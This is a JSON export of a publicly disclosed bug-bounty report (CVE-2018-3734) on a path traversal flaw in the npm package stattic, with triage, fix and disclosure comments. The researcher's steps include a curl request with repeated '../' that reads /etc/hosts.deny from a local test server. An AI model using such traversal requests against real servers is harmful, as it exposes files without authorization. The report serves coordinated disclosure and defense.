@@ -1,0 +1,463 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "eveeez", 
+        "khaledibnalwalid", 
+        "whitesector", 
+        "craxerbikash", 
+        "japz", 
+        "geotester", 
+        "alexoooo"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 319003, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-05T19:35:26.918Z", 
+    "vulnerability_information": "I would like to report Path Traversal in ```stattic``` module.\nIt allows to read content of some arbitrary files from the server where ```stattic``` is installed and run.\n\n## Module\n\n**module name:** stattic\n**version:** 0.2.3\n**npm page:** https://www.npmjs.com/package/stattic\n\n### Module Description\n\nRidiculous simple script for serving static files using http module.\n\n### Module Stats\n\nStats\n7 downloads in the last day\n32 downloads in the last week\n77 downloads in the last month\n\n~900 estimated downloads per year\n\n## Vulnerability Description\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\n\nHowever, this issue allows to read only files with extension, because if no extension is provided, ```stattic``` by default uses setting from ```options.index``` variable.\n\n## Steps To Reproduce:\n\nInstall ```stattic``` module:\n\n```\n$ npm install stattic\n```\n\nCreate sample application:\n\n```javascript\n// app.js\n//Import libs\nvar stattic = require('stattic');\n \n//Set the folder with the static files\nstattic.set('folder', './');\n \n//Set the port\nstattic.set('port', 8080);\n \n//Run the server\nstattic.listen();\n```\n\nRun application:\n\n```\n$ node app.js\n```\n\nHere's the part of ```stattic``` code responsible for handling paths:\n\n```javascript\n// node_modules/stattic/index.js, line 70:\n\n    //Parse the request url and get only the pathname\n    var pathname = url.parse(req.url).pathname;\n\n    //Resolve to the local folder\n    var local_path = path.join(options.folder, pathname);\n\n    //Check the extension\n    if(path.extname(local_path) === '')\n    {\n      //Add the index file to the local path\n      local_path = path.join(local_path, './' + path.basename(options.index));\n    }\n\n```\n\nIf file provided has no extension, ```/``` and ```options.index``` are added (by default, it will become ```/index.html```). This causes that eg. ```/etc/passwd``` path become ```/etc/passwd/index.html```, but ```/etc/hosts.deny``` is valid filename and can be read:\n\n```\n$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n> GET /../../../../../etc/hosts.deny HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: null\n< Date: Fri, 23 Feb 2018 12:36:35 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n#                  See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: some.host.name, .some.domain\n#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n#\n# If you're going to protect the portmapper use the name \"rpcbind\" for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n# The PARANOID wildcard matches any host whose name does not match its\n# address.\n#\n# You may wish to enable this to ensure any programs that don't\n# validate looked up hostnames still leave understandable logs. In past\n# versions of Debian this has been the default.\n# ALL: PARANOID\n\n* Connection #0 to host localhost left intact\n```\n\n## Patch\n\nProbably some protection against typical Path Traversal exploitation methods should be introduced here.\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 8.6, 
+        "author_type": "Team"
+    }, 
+    "title": "[stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)", 
+    "is_member_of_team?": null, 
+    "vote_count": 7, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "stattic", 
+        "max_severity": "critical", 
+        "databaseId": 6377, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-04-04T19:35:27.118Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3734"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-23T15:15:43.845Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-23T15:15:43.845Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2425882, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-23T15:15:57.340Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-23T15:15:57.340Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (8.6)", 
+                "old_severity": "Low"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2425885, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-02-23T15:16:57.065Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-23T15:16:57.065Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "stattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2425887, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-23T15:17:33.082Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-23T15:17:33.082Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @bl4de,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n", 
+            "markdown_message": "<p>Hi <a href=\"/bl4de\">@bl4de</a>,</p>\n\n<p>Thanks for reporting this issue.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2425891, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-23T18:38:19.595Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-23T18:38:19.595Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "cve_ids": [
+                "CVE-2018-3734"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2426691, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-03T11:10:55.877Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-03T11:10:55.877Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I opened a generic security issue in the repo to invite the maintainers to the discussion.", 
+            "markdown_message": "<p>I opened a generic security issue in the repo to invite the maintainers to the discussion.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2452797, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T09:53:32.018Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T09:53:32.018Z", 
+            "actor": {
+                "username": "jmjuanes", 
+                "url": "/jmjuanes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2457733, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T14:44:17.589Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T14:44:17.589Z", 
+            "actor": {
+                "username": "jmjuanes", 
+                "url": "/jmjuanes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi,\nThanks for your report. This issue is now solved in `v0.3.0`.\n\n```\n$ git clone https://github.com/jmjuanes/stattic.git\n$ cd stattic/\n$ ll\ntotal 64\n-rw-r--r--  1 jmjuanes  staff  1081 Mar  5 11:01 LICENSE\n-rw-r--r--  1 jmjuanes  staff  2372 Mar  5 11:01 README.md\ndrwxr-xr-x  3 jmjuanes  staff   102 Mar  5 11:01 assets\n-rw-r--r--  1 jmjuanes  staff   731 Mar  5 12:56 cli.js\n-rw-r--r--  1 jmjuanes  staff  4279 Mar  5 12:49 index.js\ndrwxr-xr-x  5 jmjuanes  staff   170 Mar  5 12:56 node_modules\n-rw-r--r--  1 jmjuanes  staff   594 Mar  5 12:56 package-lock.json\n-rw-r--r--  1 jmjuanes  staff   513 Mar  5 12:57 package.json\n-rw-r--r--  1 jmjuanes  staff   335 Mar  5 11:01 stattic.iml\n$ node cli.js --folder ./assets\n\nStatic server listening on: http://localhost:5000\nReading files from: /Users/jmjuanes/workspace/stattic/assets\n```\nIf you try to read the `package.json` file located in the parent folder, it throws a 404 http status:\n```\n$ curl -v --path-as-is http://localhost:5000/../package.json\n*   Trying ::1...\n* Connected to localhost (::1) port 5000 (#0)\n> GET /../package.json HTTP/1.1\n> Host: localhost:5000\n> User-Agent: curl/7.43.0\n> Accept: */*\n>\n< HTTP/1.1 404 OK\n< Content-Type: text/html\n< Date: Mon, 05 Mar 2018 14:28:53 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n<\n<!-- External resources -->\n<link href=\"https://fonts.googleapis.com/css?family=Montserrat\" rel=\"stylesheet\">\n\n<!-- Styles -->\n<style>\n  body\n  {\n    font-family: 'Montserrat', sans-serif;\n    margin: 0px;\n    margin-top: 200px;\n    padding: 0px;\n    font-size: 14px;\n    color: #697496;\n  }\n  .error-header\n  {\n    display:block;\n    font-size: 17px;\n    font-weight: bold;\n    color: #57607c;\n    margin-bottom: 8px;\n  }\n  .error-detail\n  {\n    display: block;\n  }\n</style>\n\n<!-- Error header -->\n<div class=\"error-header\" align=\"center\">Error 404</div>\n\n<!-- Error detail information -->\n<div class=\"error-detail\" align=\"center\">File not found on the server. Try again or contact with the administrator.</div>\n* Connection #0 to host localhost left intact\n```\n\nFurther comments or issues, please open a new issue in the repository. \n\nRegards,\nJose.", 
+            "markdown_message": "<p>Hi,<br>\nThanks for your report. This issue is now solved in <code>v0.3.0</code>.</p>\n<pre class=\"highlight plaintext\"><code>$ git clone https://github.com/jmjuanes/stattic.git\n$ cd stattic/\n$ ll\ntotal 64\n-rw-r--r--  1 jmjuanes  staff  1081 Mar  5 11:01 LICENSE\n-rw-r--r--  1 jmjuanes  staff  2372 Mar  5 11:01 README.md\ndrwxr-xr-x  3 jmjuanes  staff   102 Mar  5 11:01 assets\n-rw-r--r--  1 jmjuanes  staff   731 Mar  5 12:56 cli.js\n-rw-r--r--  1 jmjuanes  staff  4279 Mar  5 12:49 index.js\ndrwxr-xr-x  5 jmjuanes  staff   170 Mar  5 12:56 node_modules\n-rw-r--r--  1 jmjuanes  staff   594 Mar  5 12:56 package-lock.json\n-rw-r--r--  1 jmjuanes  staff   513 Mar  5 12:57 package.json\n-rw-r--r--  1 jmjuanes  staff   335 Mar  5 11:01 stattic.iml\n$ node cli.js --folder ./assets\n\nStatic server listening on: http://localhost:5000\nReading files from: /Users/jmjuanes/workspace/stattic/assets\n</code></pre>\n<p>If you try to read the <code>package.json</code> file located in the parent folder, it throws a 404 http status:</p>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://localhost:5000/../package.json\n*   Trying ::1...\n* Connected to localhost (::1) port 5000 (#0)\n&gt; GET /../package.json HTTP/1.1\n&gt; Host: localhost:5000\n&gt; User-Agent: curl/7.43.0\n&gt; Accept: */*\n&gt;\n&lt; HTTP/1.1 404 OK\n&lt; Content-Type: text/html\n&lt; Date: Mon, 05 Mar 2018 14:28:53 GMT\n&lt; Connection: keep-alive\n&lt; Transfer-Encoding: chunked\n&lt;\n&lt;!-- External resources --&gt;\n&lt;link href=&quot;https://fonts.googleapis.com/css?family=Montserrat&quot; rel=&quot;stylesheet&quot;&gt;\n\n&lt;!-- Styles --&gt;\n&lt;style&gt;\n  body\n  {\n    font-family: &#39;Montserrat&#39;, sans-serif;\n    margin: 0px;\n    margin-top: 200px;\n    padding: 0px;\n    font-size: 14px;\n    color: #697496;\n  }\n  .error-header\n  {\n    display:block;\n    font-size: 17px;\n    font-weight: bold;\n    color: #57607c;\n    margin-bottom: 8px;\n  }\n  .error-detail\n  {\n    display: block;\n  }\n&lt;/style&gt;\n\n&lt;!-- Error header --&gt;\n&lt;div class=&quot;error-header&quot; align=&quot;center&quot;&gt;Error 404&lt;/div&gt;\n\n&lt;!-- Error detail information --&gt;\n&lt;div class=&quot;error-detail&quot; align=&quot;center&quot;&gt;File not found on the server. Try again or contact with the administrator.&lt;/div&gt;\n* Connection #0 to host localhost left intact\n</code></pre>\n<p>Further comments or issues, please open a new issue in the repository. </p>\n\n<p>Regards,<br>\nJose.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2458364, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T16:19:27.098Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T16:19:27.098Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @jmjuanes ,\n\nThanks for the fix! Looks good to me :)\n\n@lirantal - I can confirm issue is not reproducible in 0.3.0 :)\n\nbl4de", 
+            "markdown_message": "<p>Hi <a href=\"/jmjuanes\">@jmjuanes</a> ,</p>\n\n<p>Thanks for the fix! Looks good to me :)</p>\n\n<p><a href=\"/lirantal\">@lirantal</a> - I can confirm issue is not reproducible in 0.3.0 :)</p>\n\n<p>bl4de</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2460221, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T19:35:02.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T19:35:02.122Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Great stuff guys, thanks!\n@jmjuanes @bl4de are you both ok if I proceed with a full public disclosure of the report?", 
+            "markdown_message": "<p>Great stuff guys, thanks!<br>\n<a href=\"/jmjuanes\">@jmjuanes</a> <a href=\"/bl4de\">@bl4de</a> are you both ok if I proceed with a full public disclosure of the report?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2461287, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2018-03-05T19:35:19.747Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T19:35:19.747Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2461289, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T19:35:26.982Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T19:35:26.982Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2461290, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-06T12:08:12.017Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-06T12:08:12.017Z", 
+            "actor": {
+                "username": "jmjuanes", 
+                "url": "/jmjuanes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@lirantal Yes, please :)", 
+            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> Yes, please :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2463794, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-06T22:04:34.201Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-06T22:04:34.201Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ManuallyDisclosed", 
+            "id": 2465508, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 19, 
+        "name": "Path Traversal"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -21264656.34238908, 
+    "disclosed_at": "2018-03-06T22:04:34.271Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/319003", 
+    "created_at": "2018-02-23T12:44:58.526Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>I would like to report Path Traversal in <code>stattic</code> module.<br>\nIt allows to read content of some arbitrary files from the server where <code>stattic</code> is installed and run.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>module name:</strong> stattic<br>\n<strong>version:</strong> 0.2.3<br>\n<strong>npm page:</strong> <a title=\"https://www.npmjs.com/package/stattic\" href=\"/redirect?signature=fc5c7377f5308d6b357ac345dbef84ceda1f435e&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fstattic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/stattic</span><i class=\"icon-external-link\"></i></a></p>\n\n<h3 id=\"module-description\">Module Description</h3>\n\n<p>Ridiculous simple script for serving static files using http module.</p>\n\n<h3 id=\"module-stats\">Module Stats</h3>\n\n<p>Stats<br>\n7 downloads in the last day<br>\n32 downloads in the last week<br>\n77 downloads in the last month</p>\n\n<p>~900 estimated downloads per year</p>\n\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n\n<p>Path Traversal vulnerability in <code>stattic module</code> allows to go up in directory tree and read content of some files outside of the root path set up in the module config.</p>\n\n<p>However, this issue allows to read only files with extension, because if no extension is provided, <code>stattic</code> by default uses setting from <code>options.index</code> variable.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>Install <code>stattic</code> module:</p>\n<pre class=\"highlight plaintext\"><code>$ npm install stattic\n</code></pre>\n<p>Create sample application:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// app.js</span>\n<span class=\"c1\">//Import libs</span>\n<span class=\"kd\">var</span> <span class=\"nx\">stattic</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;stattic&#39;</span><span class=\"p\">);</span>\n\n<span class=\"c1\">//Set the folder with the static files</span>\n<span class=\"nx\">stattic</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">&#39;folder&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;./&#39;</span><span class=\"p\">);</span>\n\n<span class=\"c1\">//Set the port</span>\n<span class=\"nx\">stattic</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">&#39;port&#39;</span><span class=\"p\">,</span> <span class=\"mi\">8080</span><span class=\"p\">);</span>\n\n<span class=\"c1\">//Run the server</span>\n<span class=\"nx\">stattic</span><span class=\"p\">.</span><span class=\"nx\">listen</span><span class=\"p\">();</span>\n</code></pre>\n<p>Run application:</p>\n<pre class=\"highlight plaintext\"><code>$ node app.js\n</code></pre>\n<p>Here&#39;s the part of <code>stattic</code> code responsible for handling paths:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/stattic/index.js, line 70:</span>\n\n    <span class=\"c1\">//Parse the request url and get only the pathname</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">parse</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">).</span><span class=\"nx\">pathname</span><span class=\"p\">;</span>\n\n    <span class=\"c1\">//Resolve to the local folder</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">local_path</span> <span class=\"o\">=</span> <span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">join</span><span class=\"p\">(</span><span class=\"nx\">options</span><span class=\"p\">.</span><span class=\"nx\">folder</span><span class=\"p\">,</span> <span class=\"nx\">pathname</span><span class=\"p\">);</span>\n\n    <span class=\"c1\">//Check the extension</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">extname</span><span class=\"p\">(</span><span class=\"nx\">local_path</span><span class=\"p\">)</span> <span class=\"o\">===</span> <span class=\"s1\">&#39;&#39;</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"c1\">//Add the index file to the local path</span>\n      <span class=\"nx\">local_path</span> <span class=\"o\">=</span> <span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">join</span><span class=\"p\">(</span><span class=\"nx\">local_path</span><span class=\"p\">,</span> <span class=\"s1\">&#39;./&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">basename</span><span class=\"p\">(</span><span class=\"nx\">options</span><span class=\"p\">.</span><span class=\"nx\">index</span><span class=\"p\">));</span>\n    <span class=\"p\">}</span>\n\n</code></pre>\n<p>If file provided has no extension, <code>/</code> and <code>options.index</code> are added (by default, it will become <code>/index.html</code>). This causes that eg. <code>/etc/passwd</code> path become <code>/etc/passwd/index.html</code>, but <code>/etc/hosts.deny</code> is valid filename and can be read:</p>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n&gt; GET /../../../../../etc/hosts.deny HTTP/1.1\n&gt; Host: localhost:8080\n&gt; User-Agent: curl/7.47.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 200 OK\n&lt; Content-Type: null\n&lt; Date: Fri, 23 Feb 2018 12:36:35 GMT\n&lt; Connection: keep-alive\n&lt; Transfer-Encoding: chunked\n&lt; \n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n#                  See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: some.host.name, .some.domain\n#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n#\n# If you&#39;re going to protect the portmapper use the name &quot;rpcbind&quot; for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n# The PARANOID wildcard matches any host whose name does not match its\n# address.\n#\n# You may wish to enable this to ensure any programs that don&#39;t\n# validate looked up hostnames still leave understandable logs. In past\n# versions of Debian this has been the default.\n# ALL: PARANOID\n\n* Connection #0 to host localhost left intact\n</code></pre>\n<h2 id=\"patch\">Patch</h2>\n\n<p>Probably some protection against typical Path Traversal exploitation methods should be introduced here.</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>Operating system: Ubuntu 16.04</li>\n<li>Node.js 8.9.4</li>\n<li>npm v. 5.6.0</li>\n<li>curl 7.47.0</li>\n</ul>\n\n<h2 id=\"wrap-up\">Wrap up</h2>\n\n<ul>\n<li>I contacted the maintainer to let him know: [N] </li>\n<li>I opened an issue in the related repository: [N] </li>\n</ul>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Path Traversal vulnerability in <code>stattic module</code> allows to go up in directory tree and read content of some files outside of the root path set up in the module 